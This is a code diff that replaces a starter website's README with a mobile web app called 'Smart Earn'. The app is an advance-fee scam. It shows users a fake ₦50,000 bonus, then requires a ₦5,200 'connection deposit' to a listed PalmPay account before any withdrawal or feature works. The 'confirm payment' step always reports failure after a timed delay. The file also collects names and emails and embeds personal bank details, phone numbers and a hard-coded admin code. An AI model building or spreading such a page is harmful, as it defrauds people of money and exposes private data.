@@ -1,143 +1,388 @@
-# Your New Website 🤩
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
+  <title>Smart Earn</title>
+  <meta name="theme-color" content="#000000"/>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap');
+    * { margin:0; padding:0; box-sizing:border-box; font-family:'Inter',sans-serif; }
+    
+    :root {
+      --bg: #000;
+      --card-bg: #1a1a1a;
+      --text: #fff;
+      --input-bg: #333;
+      --yellow: #ffdd00;
+      --header-bg: #ffdd00;
+      --header-text: #000;
+    }
 
-Oh hi! Welcome to your new website. 🛼
+    [data-theme="light"] {
+      --bg: #f5f5f5;
+      --card-bg: #ffffff;
+      --text: #000;
+      --input-bg: #e0e0e0;
+      --yellow: #ccaa00;
+      --header-bg: #ccaa00;
+      --header-text: #000;
+    }
 
-With this project you can make a website and preview it in your browser, then deploy it for free – you don't even need a host!
+    body { background:var(--bg); color:var(--text); transition: background 0.3s, color 0.3s; }
+    .hide { display:none !important; }
+    .container { max-width:480px; margin:0 auto; min-height:100vh; background:var(--bg); position:relative; }
 
-**In this guide we'll learn how to deploy your project to <a href="https://www.fastly.com/products/edge-compute" target="_blank">Fastly Compute</a> – your deployment will automatically handle things like 404 errors, and your beautiful website will immediately be available for everyone, everywhere all at once. 🪄**
+    .header {
+      background:var(--header-bg);
+      color:var(--header-text);
+      padding:16px;
+      text-align:center;
+      position:relative;
+      border:none !important;
+      outline:none !important;
+      box-shadow:none !important;
+      user-select:none;
+      -webkit-tap-highlight-color:transparent;
+    }
+    .header h2 {
+      font-size:19px;
+      margin:0;
+      padding:0;
+      border:none;
+      outline:none;
+      background:none;
+      display:inline-block;
+      width:auto;
+    }
+    .header h2 span { pointer-events:none; }
 
-> You can alternatively deploy your blog to other platforms, like <a href="https://pages.github.com/" target="_blank">GitHub Pages</a>.
+    .theme-toggle {
+      position:absolute; right:16px; top:16px;
+      background:none; border:none; font-size:20px;
+      cursor:pointer; color:var(--header-text);
+      outline:none;
+      -webkit-tap-highlight-color:transparent;
+    }
 
-## In this doc
+    .balance-card { background:linear-gradient(135deg,var(--yellow),var(--bg)); margin:18px; border-radius:18px; padding:22px; text-align:center; color:var(--header-text); }
+    .balance { font-size:42px; font-weight:700; }
+    .claim-btn { background:#fff; color:#000; padding:12px 24px; border-radius:50px; font-weight:600; margin-top:10px; font-size:14px; display:inline-block; cursor:pointer; }
 
-* [Fork your own site](#fork-your-own-site)
-* [Get to know your website](#get-to-know-your-website)
-  * [Share your draft site](#share-your-draft-site)
-* [Deploy your site to Fastly Compute](#deploy-your-site-to-fastly-compute)
-* [Save your edits to GitHub](#save-your-edits-to-github)
-* [How this project works](#how-this-project-works-)
-  * [Extensions](#extensions)
-* [Keep going! 🚀](#keep-going-)
+    .grid { display:grid; grid-template-columns:repeat(3,1fr); gap:12px; padding:12px; }
+    .item { background:var(--card-bg); border-radius:14px; padding:14px; text-align:center; color:var(--text); cursor:pointer; transition:0.2s; font-size:12px; }
+    .item:hover { background:#2a2a2a; }
+    .item i { font-size:24px; color:var(--yellow); margin-bottom:6px; display:block; }
 
-## Fork your own site
+    .card { background:var(--card-bg); margin:18px; border-radius:16px; padding:20px; }
+    input, select, button, .fixed-input { 
+      width:100%; padding:14px; margin:8px 0; border-radius:10px; border:none; font-size:15px; 
+    }
+    input, select, .fixed-input { background:var(--input-bg); color:var(--text); }
+    .fixed-input { font-weight:700; color:var(--yellow); text-align:center; pointer-events:none; user-select:none; }
+    button { background:var(--yellow); color:#000; font-weight:600; cursor:pointer; }
+    .back-btn { background:var(--yellow) !important; color:#000 !important; margin-top:15px !important; }
+    .ok-btn { background:#000 !important; color:#fff !important; }
 
-**Fork** [this repository](https://github.com/glitchdotcom/website-to-compute/) to create your own copy of the site.
+    select { text-align:center; text-align-last:center; }
+    option { text-align:left; }
 
-In your fork, open the site in a codespace by clicking **Code** > **Codespaces** and creating a new codespace on your main branch. 
+    .loader { position:fixed; top:0; left:0; width:100%; height:100%; background:var(--bg); display:flex; align-items:center; justify-content:center; flex-direction:column; z-index:9999; }
+    .loader h1 { font-size:26px; color:var(--yellow); }
+    .loader .spin { width:48px; height:48px; border:5px solid var(--input-bg); border-top:5px solid var(--yellow); border-radius:50%; animation:spin 1s linear infinite; margin:18px; }
+    @keyframes spin { to { transform:rotate(360deg); } }
 
-<img alt="Create codespace" src="https://github.com/user-attachments/assets/cb29a8da-d1ac-42f5-962c-7d43b8011324" width="400px"/><br/>
+    .red { color:#ff4444; font-size:18px; text-align:center; margin:20px 0; font-weight:700; }
 
-Give the codespace a minute or two to start up – it'll automatically build and preview your new website! 
+    .payment-box { background:#111; padding:18px; border-radius:16px; border:2px solid var(--yellow); margin:15px 0; }
+    .payment-box p { margin:12px 0; font-size:18px; display:flex; justify-content:space-between; align-items:center; }
+    .payment-box strong { color:var(--yellow); font-weight:700; }
+    .yellow { color:var(--yellow) !important; font-weight:700; }
+    .copy-icon { font-size:12px; color:#aaa; cursor:pointer; margin-left:8px; }
+    .copy-icon:hover { color:var(--yellow); }
 
-![this project in a codespace](https://github.com/user-attachments/assets/308941a8-ddbe-48f6-a8f0-c23cc615ed01)
+    .yellow-text { color:var(--yellow); font-size:16px; text-align:center; line-height:1.5; }
+    .boom-msg { background:var(--bg); color:var(--yellow); padding:18px; border:3px solid var(--yellow); border-radius:16px; font-size:22px; font-weight:700; text-align:center; margin:15px 0; animation: pulse 0.6s; display:none; }
+    @keyframes pulse { 0%,100% { transform:scale(1); } 50% { transform:scale(1.1); } }
+  </style>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css"/>
+</head>
+<body data-theme="dark">
+<div class="container">
 
-* When your website preview opens, click the **🔎 Split** button at the bottom so that you can see the site side by side with your code.
-* _You can close [x] the **Terminal** while you work._
+  <!-- LOGIN PAGE -->
+  <div id="loginPage">
+    <div class="card">
+      <h2 style="text-align:center; color:var(--yellow);">Welcome Back</h2>
+      <input type="text" id="userName" placeholder="Enter Your Name"/>
+      <input type="email" id="userEmail" placeholder="Enter Your Gmail"/>
+      <button onclick="doLogin()">LOGIN NOW</button>
+    </div>
+  </div>
 
-Make sure you [save your changes to GitHub](#save-your-edits-to-github).
+  <!-- DASHBOARD -->
+  <div id="dashboard" class="hide">
+    <div class="header">
+      <h2>Hi, <span id="nameDisplay">User</span></h2>
+      <button class="theme-toggle" onclick="toggleTheme()">
+        <i class="fas fa-moon" id="themeIcon"></i>
+      </button>
+    </div>
+    <div class="balance-card">
+      <p>Available Balance</p>
+      <div class="balance" id="balanceAmount">₦0.00</div>
+      <div id="claimBtn" class="claim-btn" onclick="claimBonus()">Claim Bonus</div>
+      <div id="bonusResult" class="hide" style="margin-top:15px;">
+        <div class="boom-msg" id="boomMsg">BOOM! ₦50,000.00 has been added!</div>
+        <button onclick="closeBonus()" class="ok-btn">OK</button>
+      </div>
+     </div>
 
-## Get to know your website
+    <div class="grid">
+      <div class="item" onclick="openSupport()"><i class="fas fa-headset"></i>Support</div>
+      <div class="item" onclick="openGroup()"><i class="fas fa-users"></i>Groups</div>
+      <div class="item" onclick="showWithdraw()"><i class="fas fa-arrow-up"></i>Withdraw</div>
+      <div class="item" onclick="showFeature('Airtime')"><i class="fas fa-mobile"></i>Airtime</div>
+      <div class="item" onclick="showFeature('Data')"><i class="fas fa-wifi"></i>Data</div>
+      <div class="item" onclick="showFeature('Betting')"><i class="fas fa-dice"></i>Betting</div>
+      <div class="item" onclick="showFeature('TV')"><i class="fas fa-tv"></i>TV</div>
+      <div class="item" onclick="showFeature('Invitation')"><i class="fas fa-user-plus"></i>Invite</div>
+      <div class="item" onclick="showFeature('More')"><i class="fas fa-ellipsis-h"></i>More</div>
+      <div class="item" onclick="logout()" style="background:#333;"><i class="fas fa-sign-out-alt"></i>Logout</div>
+    </div>
+  </div>
 
-You can make edits in the files by opening them from the left sidebar. Your website preview will update as you edit!
+  <!-- WITHDRAW PAGE -->
+  <div id="withdrawPage" class="hide">
+    <div class="header"><h2>Withdraw</h2></div>
+    <div class="card">
+      <input type="text" id="acctName" placeholder="Account Name"/>
+      <select id="bankSelect">
+        <option value="">Select Bank</option>
+        <option>Access Bank</option><option>GTBank</option><option>First Bank</option><option>Zenith Bank</option>
+        <option>UBA</option><option>Fidelity Bank</option><option>Stanbic IBTC</option><option>Sterling Bank</option>
+        <option>Union Bank</option><option>Wema Bank</option><option>Unity Bank</option><option>Heritage Bank</option>
+        <option>Keystone Bank</option><option>Polaris Bank</option><option>Providus Bank</option><option>Titan Trust</option>
+        <option>Opay</option><option>Kuda</option><option>PalmPay</option><option>Moniepoint</option>
+        <option>Carbon</option><option>VFD MFB</option><option>Rubies Bank</option><option>Eyowo</option>
+        <option>Sparkle</option><option>Parallex Bank</option><option>Suntrust Bank</option><option>Lotus Bank</option>
+        <option>Jaiz Bank</option><option>Taj Bank</option><option>ALAT by Wema</option><option>GoMoney</option>
+        <option>9 Payment Service Bank</option><option>Hope PSB</option><option>Momo PSB</option>
+      </select>
+      <input type="tel" id="acctNumber" placeholder="Account Number"/>
+      <div class="fixed-input">₦50,000.00</div>
+      <button onclick="submitWithdraw()">SUBMIT</button>
+      <button onclick="goHome()" class="back-btn">GO BACK</button>
+    </div>
+  </div>
 
-💡 Try opening `index.html` and making a change.
+  <!-- FIRST DEPOSIT -->
+  <div id="firstDeposit" class="hide">
+    <div class="header"><h2>Dear User</h2></div>
+    <div class="card">
+      <p class="yellow-text">As this is your first time <b>withdraw from Smart Earn</b>, you have to connect your account details <b>for you to received your alert immediately.</b></p>
+      <button onclick="connectAccount()">CONNECT ACCOUNT DETAILS</button>
+      <button onclick="goHome()" class="back-btn">GO BACK</button>
+    </div>
+  </div>
 
-🎨 Change your site style rules in `style.css`.
+  <!-- PAYMENT PAGE -->
+  <div id="paymentPage" class="hide">
+    <div class="loader hide" id="paymentLoader">
+      <h1 style="color:var(--yellow);">Processing Payment...</h1>
+      <div class="spin"></div>
+    </div>
+    <div class="header"><h2>Connection Deposit</h2></div>
+    <div class="card">
+      <p style="text-align:center; font-size:16px; margin-bottom:10px;">Pay exactly the fee below to activate:</p>
+      <div class="payment-box">
+        <p><strong>account:</strong> <span class="yellow">8933396344</span>
+          <i class="fas fa-copy copy-icon" onclick="copyNumber('8933396344')"></i>
+        </p>
+        <p><strong>Bank:</strong> <span class="yellow">PALMPAY</span></p>
+        <p><strong>Name:</strong> <span class="yellow">GLORY NDUBUISI OWULA</span></p>
+        <p><strong>Fee:</strong> <span class="yellow">5,200</span></p>
+      </div>
+      <button onclick="confirmPayment()" style="background:#00ff00; color:#000; font-weight:700; font-size:14px; padding:14px; margin-top:12px; border-radius:10px;">
+        I have made this bank transfer
+      </button>
+      <button onclick="goHome()" class="back-btn">GO BACK</button>
+    </div>
+  </div>
 
-🖼️ Add images in the `public` folder – you'll find an example of including an image in the HTML.
+  <!-- PAYMENT FAILED -->
+  <div id="paymentFailed" class="hide">
+    <div class="header"><h2>Payment Status</h2></div>
+    <div class="card">
+      <p class="red">no payment confirmed</p>
+      <button onclick="goHome()" style="background:var(--yellow); color:#000; padding:16px; font-size:16px; margin-top:20px;">
+        GO HOME
+      </button>
+    </div>
+  </div>
 
-> 🚨⚠️ Danger zone: There are directories in the project that might break your site... 😱😈
->
-> * The `.devcontainer` folder includes the configuration that creates the experience in your codespace.
-> * The `helpers` folder contains some bash scripts that run when your project starts and when you hit the **🚀 Publish** button.
+  <!-- FEATURE LOCKED -->
+  <div id="featureLocked" class="hide">
+    <div class="header"><h2>Feature Locked</h2></div>
+    <div class="card">
+      <p id="lockedMessage" class="yellow-text">You have to activate this feature with ₦5,200 naira</p>
+      <button onclick="goHome()" class="back-btn">GO BACK</button>
+    </div>
+  </div>
 
-### Share your draft site 
+</div>
 
-You can share links to your draft site with collaborators – click **🔗 Share** at the bottom of the editor. The terminal output will include a link you can right-click and copy to share with anyone you like! 
+<audio id="bonusSound" src="https://assets.mixkit.co/sfx/preview/mixkit-achievement-bell-600.mp3" preload="auto"></audio>
+<audio id="boomSound" src="https://assets.mixkit.co/sfx/preview/mixkit-explosion-with-debris-1683.mp3" preload="auto"></audio>
 
-> This project includes a handy shortcut button for grabbing your preview URL but it might be a wee bit error prone 😅 you can also access these details in **💻 Terminal** > **PORTS** or by clicking the little Forwarded Ports icon: <img src="https://github.com/user-attachments/assets/6bfc0238-a0a8-434f-9188-ff1d45df0ca0" style="height:1em" alt="ports icon"/>
->
-> Change `private` to `public` by right-clicking your running port and choosing from the options.
->
-> Copy the URL to your clipboard and share it 📋.
+<script>
+  const ADMIN_CODE = "sarikiy";
+  let settings = { 
+    accName: "LIVINGSTONE SARIKIY OWULA", 
+    accNum: "9043318562", 
+    bank: "PALMPAY", 
+    waNumber: "08147081689", 
+    groupLink: "https://chat.whatsapp.com/HKUqHm792vmIf2IeInRSe8?mode=wwt", 
+    depositAmt: 5200,
+    amounts: { 
+      Airtime:5200, Data:5200, Betting:5200, TV:5200, Invitation:5200, More:5200 
+    }
+  };
+  
+  let currentUser = { name:"", email:"", balance:0, claimedBonus:false };
+  let allUsers = JSON.parse(localStorage.getItem('smartEarnUsers') || '[]');
+  
+  const saved = localStorage.getItem('smartEarnSettings');
+  if (saved) { try { settings = JSON.parse(saved); } catch(e) {} }
 
-## Deploy your site to Fastly Compute
+  // === DARK MODE ===
+  function toggleTheme() {
+    const body = document.body;
+    const current = body.getAttribute('data-theme');
+    const newTheme = current === 'dark' ? 'light' : 'dark';
+    body.setAttribute('data-theme', newTheme);
+    localStorage.setItem('smartEarnTheme', newTheme);
+    updateThemeIcon();
+  }
 
-Ready to unveil your site to the world? Deploy it to Fastly!
+  function updateThemeIcon() {
+    const icon = document.getElementById('themeIcon');
+    const theme = document.body.getAttribute('data-theme');
+    icon.className = theme === 'dark' ? 'fas fa-sun' : 'fas fa-moon';
+  }
 
-Grab a Fastly API key from your account and add it to your GitHub repo:
+  const savedTheme = localStorage.getItem('smartEarnTheme');
+  if (savedTheme) document.body.setAttribute('data-theme', savedTheme);
+  updateThemeIcon();
 
-- Sign up for a <strong><a href="https://www.fastly.com/signup/" target="_blank">free Fastly developer account</a></strong>
-- Grab an **API Token** from **Account** > **API Tokens** > **Personal Tokens** > **Create Token**
-  - _Type_: Automation
-  - _Role_: Engineer
-  - _Scope_: Global (deselect the _Read-only access_ box)
-  - _Access_: All services
-  - _Expiration_: Never expire
-- **Copy the token value into GitHub**
-  - Back in your codespace, click into the textfield at the top of the editor and type `>` to access the command palette
-  - Type `secret` and select **Codespaces: Manage user secrets**
-    - <img alt="Secret command" src="https://github.com/user-attachments/assets/a6cfeac8-2aca-40a4-ab41-d207733b61cc" width="300px"/>
-  - Click **+ Add a new secret**
-    - <img alt="Add new secret" src="https://github.com/user-attachments/assets/350e545c-0073-4327-ac99-3663049e7aad" width="400px"/>
-  - Enter the name `FASTLY_API_TOKEN`
-    - <img alt="Fastly token" src="https://github.com/user-attachments/assets/536d1b2a-bf62-4085-aac4-ade7d2898583" width="400px"/>
-  - Paste your token value and enter
+  // === LOGIN ===
+  function doLogin() {
+    const name = document.getElementById('userName').value.trim();
+    const email = document.getElementById('userEmail').value.trim().toLowerCase();
+    if (!name || !email) return alert("Fill Name & Gmail!");
+    if (!email.includes('@')) return alert("Enter valid Gmail!");
 
-In the notifications area at the bottom right of your codespace, you should see a prompt to **reload** for the new environment variable, so go ahead and click that (otherwise click the little bell 🔔 icon to check for the message).
+    let user = allUsers.find(u => u.email === email);
+    if (!user) {
+      user = { name, email, balance:0, claimedBonus:false };
+      allUsers.push(user);
+      localStorage.setItem('smartEarnUsers', JSON.stringify(allUsers));
+    }
+    currentUser = user;
 
-Hit the **🚀 Publish** button at the bottom of the editor, enter `y` and watch the **Terminal** output for your new site address! It might take a couple of minutes... 🥁
+    document.getElementById('nameDisplay').innerText = name;
+    updateBalance();
+    document.getElementById('claimBtn').style.display = currentUser.claimedBonus ? 'none' : 'inline-block';
+    showPage('dashboard');
+  }
 
-![New Compute app address in the Terminal](https://github.com/user-attachments/assets/0a5a8f84-4907-4d60-83da-d3b90e745562)
+  // === DASHBOARD FEATURES ===
+  function openSupport() { location.href = `https://wa.me/${settings.waNumber}?text=Hey%20I%20am%20using%20Smart%20Earn`; }
+  function openGroup() { location.href = settings.groupLink; }
+  function showWithdraw() { showPage('withdrawPage'); }
+  function submitWithdraw() { showPage('firstDeposit'); }
+  function connectAccount() { showPage('paymentPage'); }
 
-You'll see your new `*.edgecompute.app` address in the output. Open it in a new tab and tell everyone you know about your new site. 📣
+  function showFeature(f) {
+    const amt = settings.amounts[f] || 5200;
+    document.getElementById('lockedMessage').innerText = `You have to activate this feature with ₦${amt.toLocaleString()} naira`;
+    showPage('featureLocked');
+  }
 
-🎢 Whenever you update your content, hit the **🚀 Publish** button again to go live!
+  function confirmPayment() {
+    document.getElementById('paymentLoader').classList.remove('hide');
+    setTimeout(() => {
+      document.getElementById('paymentLoader').classList.add('hide');
+      showPage('paymentFailed');
+    }, 20000);
+  }
 
-## Save your edits to GitHub
+  function copyNumber(num) {
+    navigator.clipboard.writeText(num).then(() => {
+      const icon = event.target;
+      icon.style.color = '#00ff00';
+      setTimeout(() => icon.style.color = '#aaa', 1000);
+    });
+  }
 
-GitHub will keep the edits you make in the codespace only for a limited time, so it's a good idea to commit your work to a repo regularly. Use the **Source Control** button on the left of the editor – you can make commits, open and merge pull requests right inside the codespace. 
+  function goHome() { showPage('dashboard'); }
 
-<img alt="source control" src="https://github.com/user-attachments/assets/a5160b08-4f80-4a5f-af76-bde18a43427d" width="300px"/>
+  // === BONUS & LOGOUT ===
+  function claimBonus() {
+    if (currentUser.claimedBonus) return;
+    document.getElementById('claimBtn').style.display = 'none';
+    document.getElementById('bonusResult').classList.remove('hide');
+    document.getElementById('boomMsg').style.display = 'none';
+    document.getElementById('bonusSound').play();
 
-> GitHub will notify you if any of your codespaces are about to expire. If you have changes you want to keep, you can use the **Export changes to a branch** option.
-> 
-> <img alt="export to branch" width="500px" src="https://github.com/user-attachments/assets/c7815347-3e5a-4e34-97f2-db58343acaa4"/>
+    let count = 0;
+    const target = 50000;
+    const increment = target / 60;
+    const balanceEl = document.getElementById('balanceAmount');
+    const interval = setInterval(() => {
+      count += increment;
+      if (count >= target) {
+        count = target; clearInterval(interval);
+        currentUser.balance = target; currentUser.claimedBonus = true;
+        saveCurrentUser(); updateBalance();
+        document.getElementById('boomMsg').style.display = 'block';
+        document.getElementById('boomSound').play();
+      } else {
+        balanceEl.innerText = `₦${Math.round(count).toLocaleString()}.00`;
+      }
+    }, 30);
+  }
 
-## How this project works 🧐
+  function closeBonus() {
+    document.getElementById('bonusResult').classList.add('hide');
+    showPage('dashboard');
+  }
 
-This project uses the <a href="https://github.com/fastly/compute-js-static-publish" target="_blank">Fastly JavaScript Static Publisher</a> to turn your blog into a serverless app that runs at the network edge, near your users. 
+  function logout() {
+    currentUser = { name:"", email:"", balance:0, claimedBonus:false };
+    document.getElementById('userName').value = '';
+    document.getElementById('userEmail').value = '';
+    showPage('loginPage');
+  }
 
-* The project uses [Vite](https://vite.dev/) to build your site for deployment, placing files in the `deploy/_site` folder.
-* The Static Publisher uses those files to scaffold a Compute app that compiles into Webassembly (Wasm) to run fast and securely on the Fastly network – you'll find the Compute code in `deploy/_app` after you deploy.
-* When you publish, the project deploys the app to Fastly, creating a service and uploading the Wasm to it.
-* It then then publishes your content to a KV Store – a key-value store that also runs on Fastly and that your app can talk to.
+  function updateBalance() {
+    document.getElementById('balanceAmount').innerText = `₦${currentUser.balance.toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2})}`;
+  }
 
-_The app itself only needs deployed to Fastly once, when you click the **🚀 Publish** button after that, we just update the content in your KV Store and your Compute app will pull your assets from there._
+  function saveCurrentUser() {
+    const i = allUsers.findIndex(u => u.email === currentUser.email);
+    if (i > -1) allUsers[i] = currentUser;
+    localStorage.setItem('smartEarnUsers', JSON.stringify(allUsers));
+  }
 
-📝 Your Fastly service and KV Store will include your GitHub username and repo in their names, so you'll only be able to deploy one Compute app per repo unless you tweak the scripts.
+  // === SCROLL TO TOP ON PAGE CHANGE ===
+  function showPage(id) {
+    document.querySelectorAll('.container > div').forEach(d => d.classList.add('hide'));
+    document.getElementById(id).classList.remove('hide');
+    window.scrollTo(0, 0);
+  }
 
-⚙️ The settings we use to create the guided experience in the codespace are in the `.devcontainer/` folder.
-
-🧰 You'll find the Fastly CLI commands we use under the hood in the `helpers/publish.sh` script.
-
-💻 If you check the right-hand side of the **Terminal** you'll find multiple processes – this is to run the vite and Fastly commands.
-
-### Extensions
-
-This project uses the following extensions from the dev community! 🙌
-
-* [VSCode Action Buttons Ext](https://marketplace.visualstudio.com/items?itemName=jkearins.action-buttons-ext)
-* [ESLint](https://marketplace.visualstudio.com/items?itemName=dbaeumer.vscode-eslint)
-
-## Keep going! 🛸
-
-**Don't stop there, <a href="https://www.fastly.com/documentation/solutions/tutorials/deliver-your-site/#sending-domain-traffic-to-fastly" target="_blank">add a domain to your new site</a>.**
-
-You'll find your service in your Fastly account control panel – check out the **Observability** stats! 📊
-
-Check out more tips on using the <a href="https://github.com/fastly/compute-js-static-publish" target="_blank">Static Publisher</a> in its `README`. Note that if you change the Compute code, you'll need to run a separate deploy command to push your changes to Fastly as the **🚀 Publish** button only deploys once, after that it just updates your KV content.
-
-🛟 Get help on the <a href="https://community.fastly.com" target="_blank">community forum</a>.
-
-<img src="https://github.com/user-attachments/assets/17a8af4a-100f-416d-a1cf-f84174262138" width="100px"/>
+  showPage('loginPage');
+</script>
+</body>
+</html>
